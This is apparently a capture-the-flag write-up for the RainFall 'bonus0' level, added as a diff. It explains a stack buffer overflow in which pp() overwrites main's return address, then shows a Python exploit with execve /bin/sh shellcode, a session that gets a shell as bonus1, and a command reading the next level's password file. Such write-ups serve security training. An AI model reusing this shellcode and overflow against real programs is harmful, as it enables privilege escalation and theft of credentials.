@@ -1,0 +1,31 @@
+using local variable of p() function; the read buffer
+the concatenation in pp() overwrites main's return address
+we can specify the return address in second string, bytes[9:13]
+we make the return address the stack: the local buffer variable in p() that is used with read() function
+the read buffer variable does not get truncated or altered even after p() returns to pp(), and pp() returns to main(), the stack frame for p() still exists
+
+# ---------------------------------------------------------------------
+
+bonus0@RainFall:/tmp$ cat bonus0.py
+#!/usr/bin/env python
+sh = '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'
+print('A'*4095)
+print('B'*9 + '\xbf\xff\xe6\x8d'[::-1] + sh)
+bonus0@RainFall:/tmp$
+bonus0@RainFall:/tmp$
+bonus0@RainFall:/tmp$ ./bonus0.py > exploit_b0
+bonus0@RainFall:/tmp$
+bonus0@RainFall:/tmp$
+bonus0@RainFall:/tmp$ (cat exploit_b0 ; cat) | /home/user/bonus0/bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAABBBBBBBBB????1?1?Qh/??? BBBBBBBBB????1?1?Qh/???
+
+whoami
+bonus1
+
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+
+
